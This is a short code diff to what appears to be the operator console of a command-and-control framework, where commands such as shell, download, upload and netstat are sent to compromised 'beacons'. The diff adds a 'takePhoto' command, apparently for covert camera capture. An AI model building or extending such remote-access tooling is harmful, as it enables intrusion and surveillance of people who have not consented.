@@ -132,7 +132,7 @@ class MultiHandlerCommands:
         """
         available_commands = WordCompleter(['shell', 'close', 'processes',
         'sysinfo', 'close', 'checkfiles', 'download', 'upload', 'services',
-        'netstat', 'diskusage', 'listdir', directory_traversal'])
+        'netstat', 'diskusage', 'listdir', directoryTraversal', 'takePhoto'])
         """
         def handle_session():
             for i, details in enumerate(beacons["uuid"]):
@@ -157,7 +157,8 @@ class MultiHandlerCommands:
             "netstat": lambda: self.beaconCommands.netstat(UserID),
             "session": handle_session,
             "commands": lambda: self.beaconCommands.list_db_commands(UserID),
-            "directory_traversal": lambda: self.beaconCommands.dir_traversal(UserID)
+            "directorytraversal": lambda: self.beaconCommands.dir_traversal(UserID),
+            "takephoto": lambda: self.beaconCommands.takePhoto(UserID)
         }
 
         while True:
@@ -169,7 +170,7 @@ class MultiHandlerCommands:
                     tab_completion(text, state, [
                         "shell", "processes", "sysinfo", "close",
                         "listdir", "diskusage", "netstat", "session",
-                        "commands"
+                        "commands", "directoryTraversal", "takePhoto"
                     ]))
             command = (input(colorama.Fore.YELLOW +
                              f"{UserID} Command: ").lower())
